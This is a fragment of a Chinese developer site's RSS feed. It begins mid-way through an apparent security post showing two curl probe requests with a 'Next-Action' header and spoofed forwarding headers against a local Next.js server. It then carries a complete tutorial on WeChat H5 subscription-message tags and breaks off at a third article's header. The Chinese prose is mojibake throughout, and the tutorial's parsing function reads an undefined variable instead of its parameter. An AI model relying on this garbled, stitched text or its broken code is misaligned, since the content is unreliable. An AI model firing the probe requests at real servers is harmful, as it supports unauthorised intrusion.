name=\"2\"\x0d\x0a\x0d\x0a[]\x0d\x0a------WebKitFormBoundaryFnJiYNZt--'</span> \
    $<span class="hljs-string">'http://localhost:3000/'</span>
</code></pre>
<p>æ–¹æ³•äºŒï¼š</p>
<pre><code class="hljs language-bash" lang="bash">curl --path-as-is -i -s -k -X $<span class="hljs-string">'POST'</span> \
    -H $<span class="hljs-string">'Host: localhost:3000'</span> -H $<span class="hljs-string">'Upgrade-Insecure-Requests: 1'</span> -H $<span class="hljs-string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'</span> -H $<span class="hljs-string">'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'</span> -H $<span class="hljs-string">'Accept-Encoding: gzip, deflate'</span> -H $<span class="hljs-string">'Accept-Language: zh-TW,zh;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6'</span> -H $<span class="hljs-string">'X-Forwarded-For: 127.0.0.1'</span> -H $<span class="hljs-string">'X-Originating-Ip: 127.0.0.1'</span> -H $<span class="hljs-string">'X-Remote-Ip: 127.0.0.1'</span> -H $<span class="hljs-string">'X-Remote-Addr: 127.0.0.1'</span> -H $<span class="hljs-string">'Connection: close'</span> -H $<span class="hljs-string">'Next-Action: x'</span> -H $<span class="hljs-string">'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryY4e746pA'</span> -H $<span class="hljs-string">'Content-Length: 118'</span> \
    --data-binary $<span class="hljs-string">'------WebKitFormBoundaryY4e746pA\x0d\x0aContent-Disposition: form-data; name=\"2\"\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundaryY4e746pA--\x0d\x0a\x0d\x0a'</span> \
    $<span class="hljs-string">'http://localhost:3000/'</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¾®ä¿¡H5è®¢é˜…æ¶ˆæ¯æ¥å…¥å®æˆ˜ï¼šæ ·å¼é”™ä¹±ã€è¿”å›å€¼è§£ææŠ¥é”™ï¼Ÿé¿å‘æŒ‡å—æ¥äº†]]></title>    <link>https://juejin.cn/post/7589176150493691958</link>    <guid>https://juejin.cn/post/7589176150493691958</guid>    <pubDate>2025-12-30T02:27:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589176150493691958" data-draft-id="7589171972446994474" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¾®ä¿¡H5è®¢é˜…æ¶ˆæ¯æ¥å…¥å®æˆ˜ï¼šæ ·å¼é”™ä¹±ã€è¿”å›å€¼è§£ææŠ¥é”™ï¼Ÿé¿å‘æŒ‡å—æ¥äº†"/> <meta itemprop="keywords" content="å¾®ä¿¡,JavaScript"/> <meta itemprop="datePublished" content="2025-12-30T02:27:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å½’å…ƒç”°å±…"/> <meta itemprop="url" content="https://juejin.cn/user/4300945218869310"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¾®ä¿¡H5è®¢é˜…æ¶ˆæ¯æ¥å…¥å®æˆ˜ï¼šæ ·å¼é”™ä¹±ã€è¿”å›å€¼è§£ææŠ¥é”™ï¼Ÿé¿å‘æŒ‡å—æ¥äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4300945218869310/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å½’å…ƒç”°å±…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:27:05.000Z" title="Tue Dec 30 2025 02:27:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘æ¥äº†ä¸ªéœ€æ±‚ï¼Œè¦åœ¨H5æ´»åŠ¨é¡µé‡ŒåŠ ä¸ªå¾®ä¿¡è®¢é˜…é€šçŸ¥ã€‚å¿ƒæƒ³è¿™ä¸å°±æ˜¯è°ƒä¸ªAPIçš„äº‹å—ï¼Ÿç»“æœç¿»å¼€æ–‡æ¡£ä¸€çœ‹ï¼Œå¥½å®¶ä¼™ï¼Œç½‘é¡µç«¯æ²¡æœ‰JS API ï¼Œåªèƒ½ç”¨ <code>&lt;wx-open-subscribe&gt;</code> å¼€æ”¾æ ‡ç­¾ã€‚</p>
<p>ç¡¬ç€å¤´çš®æ¥è¿›æ¥ï¼Œç»“æœå…¨æ˜¯å‘ï¼šæ ·å¼éš”ç¦»æ­»æ´»è°ƒä¸å‡†ã€remå¸ƒå±€åœ¨æ ‡ç­¾é‡Œå¤±æ•ˆã€è¿”å›å€¼å±…ç„¶æ˜¯â€œå¥—å¨ƒâ€JSON... æŠ˜è…¾äº†ä¸€ä¸‹åˆç»ˆäºæå®šï¼Œèµ¶ç´§è®°å½•ä¸€ä¸‹ï¼Œå¸Œæœ›èƒ½å¸®å¤§å®¶å°‘æ‰å‡ æ ¹å¤´å‘ã€‚</p>
<blockquote>
<p>å®˜æ–¹æ–‡æ¡£æŒ‡è·¯ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fdoc%2Fservice%2Fguide%2Fproduct%2Fsubscription_messages%2Fintro.html" target="_blank" title="https://developers.weixin.qq.com/doc/service/guide/product/subscription_messages/intro.html" ref="nofollow noopener noreferrer">å¾®ä¿¡å®˜æ–¹æ–‡æ¡£ - è®¢é˜…æ¶ˆæ¯</a></p>
</blockquote>
<hr/>
<h2 data-id="heading-0">å‘ç‚¹ä¸€ï¼šåˆ«æ‰¾APIäº†ï¼Œåªèƒ½ç”¨å¼€æ”¾æ ‡ç­¾</h2>
<p>å¾ˆå¤šåŒå­¦åšè¿‡å°ç¨‹åºï¼Œä¹ æƒ¯äº†ç”¨ <code>wx.requestSubscribeMessage</code> æ¥å£æ¥æ‹‰èµ·æˆæƒå¼¹çª—ã€‚ä½†åœ¨ <strong>H5ï¼ˆå…¬ä¼—å·ç½‘é¡µï¼‰</strong> ç¯å¢ƒä¸‹ï¼Œ<strong>å¹¶æ²¡æœ‰</strong>ç±»ä¼¼çš„ JS API å¯ç”¨ã€‚</p>
<p>ç½‘é¡µç«¯ç›®å‰<strong>åªèƒ½</strong>é€šè¿‡ <code>&lt;wx-open-subscribe&gt;</code> å¼€æ”¾æ ‡ç­¾æ¥å®ç°ã€‚</p>
<p><strong>ç‰¹åˆ«æ³¨æ„</strong>ï¼š
è¿™ä¸ªæ ‡ç­¾å†…éƒ¨çš„å†…å®¹ï¼Œ<strong>å¿…é¡»</strong>åŒ…è£¹åœ¨ <code>&lt;script type="text/wxtag-template"&gt;</code> é‡Œé¢ã€‚
å¦‚æœä½ ç›´æ¥æŠŠ <code>&lt;style&gt;</code> æˆ– <code>&lt;button&gt;</code> å†™åœ¨ <code>&lt;wx-open-subscribe&gt;</code> ä¸‹é¢ï¼Œåœ¨çœŸæœºä¸Šæ˜¯<strong>æ¸²æŸ“ä¸å‡ºæ¥</strong>çš„ï¼ˆæˆ–è€…æ ·å¼å®Œå…¨å¤±æ•ˆï¼‰ã€‚</p>
<p><strong>é”™è¯¯å†™æ³•ï¼š</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">wx-open-subscribe</span> <span class="hljs-attr">...</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- âŒ é”™è¯¯ï¼šç›´æ¥å†™åœ¨æ ‡ç­¾ä¸‹ï¼ŒçœŸæœºä¸è®¤ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>è®¢é˜…<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">wx-open-subscribe</span>&gt;</span>
</code></pre>
<p><strong>æ­£ç¡®å†™æ³•ï¼š</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">wx-open-subscribe</span> <span class="hljs-attr">...</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- âœ… æ­£ç¡®ï¼šå¿…é¡»åŒ…è£¹åœ¨ template è„šæœ¬ä¸­ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/wxtag-template"</span>&gt;</span><span class="xml">
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>è®¢é˜…<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">wx-open-subscribe</span>&gt;</span>
</code></pre>
<p>è¿™ç©æ„æœ¬è´¨ä¸Šæ˜¯ä¸ª Web Componentï¼Œå¾®ä¿¡åœ¨é‡Œé¢æäº†ä¸ª Shadow DOMï¼ˆæ²™ç®±ç¯å¢ƒï¼‰ã€‚è¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</p>
<ol>
<li><strong>æ ·å¼éš”ç¦»</strong>ï¼šä½ å¤–éƒ¨å†™çš„ CSS æ ·å¼ï¼Œæ ‡ç­¾é‡Œé¢æ ¹æœ¬ä¸è®¤ã€‚</li>
<li><strong>æ— æ³•ä¸»åŠ¨è§¦å‘</strong>ï¼šä½ ä¸èƒ½å†™ä¸ª JS å‡½æ•°å»è°ƒç”¨å®ƒï¼Œå¿…é¡»ç”±ç”¨æˆ·ç‚¹å‡»è¿™ä¸ªæ ‡ç­¾æ‰èƒ½è§¦å‘å¼¹çª—ã€‚</li>
</ol>
<p>æ‰€ä»¥ï¼Œåˆ«æƒ³ç€é€šè¿‡ JS é€»è¾‘å»æ§åˆ¶å¼¹çª—äº†ï¼Œè€è€å®å®æŠŠæ ‡ç­¾å†™åœ¨é¡µé¢ä¸Šå§ã€‚</p>
<hr/>
<h2 data-id="heading-1">å‘ç‚¹äºŒï¼šæ ·å¼æ­»æ´»è°ƒä¸å‡†ï¼Ÿï¼ˆé™„è§£å†³æ–¹æ¡ˆï¼‰</h2>
<p>è¿™æ˜¯æœ€æå¿ƒæ€çš„åœ°æ–¹ã€‚æˆ‘ä»¬çš„æ´»åŠ¨é¡µä¸€èˆ¬éƒ½ç”¨ <code>rem</code> åšé€‚é…ï¼Œç»“æœæˆ‘æŠŠä»£ç æ”¾è¿›å»ä¸€çœ‹ï¼ŒæŒ‰é’®å°å¾—åƒèš‚èšã€‚</p>
<p><strong>åŸå› </strong>ï¼šæ ‡ç­¾å†…éƒ¨çš„æ²™ç®±ç¯å¢ƒ<strong>ä¸ç»§æ‰¿</strong>å¤–éƒ¨ <code>html</code> æ ¹èŠ‚ç‚¹çš„ <code>font-size</code>ã€‚ä½ åœ¨å¤–é¢è®¾äº† <code>1rem = 100px</code>ï¼Œå®ƒåœ¨é‡Œé¢åªè®¤æµè§ˆå™¨çš„é»˜è®¤å€¼ï¼ˆé€šå¸¸æ˜¯ 16pxï¼‰ï¼Œæ‰€ä»¥ä½ çš„ <code>2rem</code> åœ¨é‡Œé¢å°±å˜æˆäº† <code>32px</code>ã€‚</p>
<p><strong>æ€ä¹ˆè§£ï¼Ÿ</strong>
åœ¨æ ‡ç­¾é‡Œçš„ <code>&lt;style&gt;</code> å†™æ­» <code>pxæˆ–è€…vw</code>ï¼Ÿå¤ªéº»çƒ¦äº†ï¼Œè¿˜å¾—ç®—ã€‚
<strong>æœ€ç»ˆæ–¹æ¡ˆï¼šé€æ˜å±‚è¦†ç›–æ³•ï¼ˆæ¨èï¼‰</strong></p>
<p>æ—¢ç„¶æ ‡ç­¾é‡Œçš„æ ·å¼éš¾è°ƒï¼Œé‚£æˆ‘ä»¬å¹²è„†<strong>ä¸è°ƒäº†</strong>ã€‚</p>
<ol>
<li><strong>å¤–éƒ¨</strong>ï¼šæŒ‰æ­£å¸¸å†™æ³•ï¼Œç”¨ <code>rem</code> å†™ä¸€ä¸ªæ¼‚äº®çš„æŒ‰é’®ï¼Œæƒ³æ€ä¹ˆèŠ±å“¨æ€ä¹ˆèŠ±å“¨ã€‚</li>
<li><strong>å†…éƒ¨</strong>ï¼šæŠŠ <code>&lt;wx-open-subscribe&gt;</code> æ ‡ç­¾ç›–åœ¨è¿™ä¸ªæŒ‰é’®ä¸Šé¢ï¼Œè®¾ç½®é€æ˜åº¦ä¸º 0ã€‚</li>
</ol>
<p>è¿™æ ·ç”¨æˆ·çœ‹ç€æ˜¯ç‚¹äº†ä½ çš„æ¼‚äº®æŒ‰é’®ï¼Œå®é™…ä¸Šç‚¹çš„æ˜¯é€æ˜çš„å¾®ä¿¡æ ‡ç­¾ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- å¤–éƒ¨å®¹å™¨ï¼šæ§åˆ¶æ•´ä½“ä½ç½® --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"subscribe-wrapper"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"position: relative; display: inline-block;"</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 1. ä½ çš„æ¼‚äº®æŒ‰é’®ï¼ˆè§†è§‰å±‚ï¼‰ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"my-custom-btn"</span>&gt;</span>ğŸŒŸ è®¢é˜…é€šçŸ¥ ğŸŒŸ<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 2. å¾®ä¿¡æ ‡ç­¾ï¼ˆé€»è¾‘å±‚ï¼‰ï¼šç»å¯¹å®šä½è¦†ç›–åœ¨ä¸Šé¢ï¼Œé€æ˜ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">wx-open-subscribe</span> <span class="hljs-attr">template</span>=<span class="hljs-string">"ä½ çš„æ¨¡æ¿ID"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"subscribe-btn"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"position: absolute; top:0; left:0; width:100%; height:100%; opacity: 0;"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/wxtag-template"</span>&gt;</span><span class="xml">
            <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
                <span class="hljs-comment">/* å…³é”®ï¼šæŠŠå†…éƒ¨æŒ‰é’®æ’‘æ»¡æ•´ä¸ªåŒºåŸŸ */</span>
                <span class="hljs-selector-class">.trigger-btn</span> {
                    <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
                    <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
                    <span class="hljs-attribute">background</span>: transparent;
                    <span class="hljs-attribute">border</span>: none;
                }
            </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"trigger-btn"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">wx-open-subscribe</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>è¿™æ ·ä¸€æ¥ï¼Œæ ·å¼é—®é¢˜ç›´æ¥ç»•è¿‡å»äº†ï¼Œå®Œç¾é€‚é…å„ç§å±å¹•ã€‚</p>
<hr/>
<h2 data-id="heading-2">å‘ç‚¹ä¸‰ï¼šå¥‡è‘©çš„è¿”å›å€¼è§£æ</h2>
<p>å¥½ä¸å®¹æ˜“å¼¹çª—å‡ºæ¥äº†ï¼Œç”¨æˆ·ç‚¹äº†â€œå…è®¸â€ï¼Œç»“æœå›è°ƒé‡Œçš„æ•°æ®æ ¼å¼åˆç»™æˆ‘æ•´ä¸ä¼šäº†ã€‚</p>
<p><code>e.detail.subscribeDetails</code> è¿”å›çš„ä¸æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>å­—ç¬¦ä¸²</strong>ã€‚
ä½ ä»¥ä¸º <code>JSON.parse</code> ä¸€æ¬¡å°±å®Œäº†ï¼Ÿå¤©çœŸã€‚
è§£æå‡ºæ¥çš„å€¼ï¼Œå¯¹åº”çš„ value <strong>å±…ç„¶è¿˜æ˜¯ä¸ªå­—ç¬¦ä¸²</strong>ï¼è¿™æ˜¯ä»€ä¹ˆâ€œå¥—å¨ƒâ€æ“ä½œï¼Ÿ</p>
<p><strong>é”™è¯¯çš„å†™æ³•ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æŠ¥é”™ï¼</span>
<span class="hljs-keyword">var</span> res = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(e.<span class="hljs-property">detail</span>.<span class="hljs-property">subscribeDetails</span>);
<span class="hljs-keyword">if</span> (res[<span class="hljs-string">'æ¨¡æ¿ID'</span>].<span class="hljs-property">status</span> === <span class="hljs-string">'accept'</span>) { ... } 
</code></pre>
<p><strong>æ­£ç¡®çš„å†™æ³•ï¼ˆå°è£…ä¸ªå‡½æ•°ä¿å¹³å®‰ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è§£æå‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getSubscribeStatus</span>(<span class="hljs-params">detailsStr, templateId</span>) {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> detail = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(e.<span class="hljs-property">detail</span>.<span class="hljs-property">subscribeDetails</span>);
        <span class="hljs-keyword">const</span> status = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(detail[templateId]).<span class="hljs-property">status</span>;
        
        <span class="hljs-keyword">return</span> status; <span class="hljs-comment">// è¿”å› 'accept', 'reject' ç­‰çŠ¶æ€</span>
    } <span class="hljs-keyword">catch</span> (e) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è§£æè®¢é˜…çŠ¶æ€å¤±è´¥'</span>, e);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}

<span class="hljs-comment">// è°ƒç”¨</span>
btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'success'</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) {
    <span class="hljs-keyword">var</span> status = <span class="hljs-title function_">getSubscribeStatus</span>(e.<span class="hljs-property">detail</span>.<span class="hljs-property">subscribeDetails</span>, <span class="hljs-string">'ä½ çš„æ¨¡æ¿ID'</span>);
    <span class="hljs-keyword">if</span> (status === <span class="hljs-string">'accept'</span>) {
        <span class="hljs-title function_">alert</span>(<span class="hljs-string">'è®¢é˜…æˆåŠŸï¼'</span>);
    }
});
</code></pre>
<hr/>
<h2 data-id="heading-3">å…¶ä»–å‡ ä¸ªå®¹æ˜“è¸©çš„é›·</h2>
<ol>
<li>
<p><strong>çœŸæœºï¼çœŸæœºï¼çœŸæœºï¼</strong>
å¾®ä¿¡å¼€å‘è€…å·¥å…·å¯¹è¿™ä¸ªæ ‡ç­¾çš„æ”¯æŒå¾ˆè¿·ï¼Œåªä¼šä½¿ç”¨å†…ç½®çš„ä¸€å¥—æ¨¡æ¿IDï¼Œä¸ä¼šä½¿ç”¨ä½ æ‰€ä¼ é€’çš„æ¨¡æ¿IDï¼Œè€Œä¸”æœ‰æ—¶å€™æ ·å¼ä¸å¯¹ï¼Œæœ‰æ—¶å€™ç‚¹å‡»æ²¡ååº”ã€‚<strong>ä¸€å®šè¦ç”¨çœŸæœºæµ‹è¯•</strong>ï¼Œä»¥çœŸæœºè¡¨ç°ä¸ºå‡†ã€‚</p>
</li>
<li>
<p><strong>æ¨¡æ¿IDå½’å±æƒ</strong>
å¦‚æœä½ ç‚¹å‡»æŒ‰é’®æ²¡æœ‰ä»»ä½•ååº”ï¼Œæˆ–è€… <code>error</code> äº‹ä»¶æŠ¥é”™ ï¼Œå…ˆåˆ«æ€€ç–‘ä»£ç ã€‚å»æ£€æŸ¥ä¸€ä¸‹è¿™ä¸ªæ¨¡æ¿ ID æ˜¯å¦æœ‰æ•ˆ(æ˜¯å¦è¢«åˆ é™¤)ï¼Œæ˜¯ä¸æ˜¯å±äºå½“å‰é¡µé¢çš„å…¬ä¼—å·ï¼ˆAppIDï¼‰ã€‚</p>
</li>
<li>
<p><strong>è§†å£ç¼©æ”¾ï¼ˆViewportï¼‰é—®é¢˜</strong>
å¦‚æœä½ çš„é¡µé¢ç”¨äº† <code>width=750</code> è¿™ç§ç¼©æ”¾æ–¹æ¡ˆï¼Œå¾®ä¿¡åŸç”Ÿçš„å¼¹çª—ä¹Ÿä¼šè·Ÿç€è¢«ç¼©å°ï¼Œå¯¼è‡´å­—å°å¾—çœ‹ä¸æ¸…ã€‚
å»ºè®®æ”¹ç”¨æ ‡å‡†çš„ <code>&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</code>ï¼Œé…åˆ <code>rem</code> å¸ƒå±€ï¼Œè¿™æ ·åŸç”Ÿç»„ä»¶æ‰èƒ½æ­£å¸¸æ˜¾ç¤ºã€‚</p>
</li>
</ol>
<hr/>
<h2 data-id="heading-4">æ€»ç»“</h2>
<p>æå®šå¾®ä¿¡è®¢é˜…æ¶ˆæ¯ï¼Œæ ¸å¿ƒå°±ä¸‰å¥è¯ï¼š</p>
<ol>
<li><strong>æ”¾å¼ƒ APIï¼Œæ‹¥æŠ±æ ‡ç­¾ã€‚</strong></li>
<li><strong>æ ·å¼åˆ«ç¡¬åˆšï¼Œé€æ˜è¦†ç›–æœ€é¦™ã€‚</strong></li>
<li><strong>è¿”å›å€¼æ˜¯å¥—å¨ƒï¼Œå¤šå±‚è§£æè¦è·Ÿä¸Šã€‚</strong></li>
</ol>
<p>å¸Œæœ›èƒ½å¸®åˆ°æ­£åœ¨è¸©å‘çš„ä½ ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Œâœï¸JSåŸå­ç¬”è®° ã€é›¶åŸºç¡€åƒé€ Proxy æ•°æ®å“åº”å¼]]></title>    <link>https://juejin.cn/post/7589201772118016006</link>    <guid>https://juejin.cn/post/7589201772118016006</guid>    <pubDate>2025-12-29T13:16:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589201772118016006" data-draft-id="7589201772117966854" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Œâœï¸JSåŸå­ç¬”è®° ã€é›¶åŸºç¡€åƒé€ Proxy æ•°æ®å“åº”å¼"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" 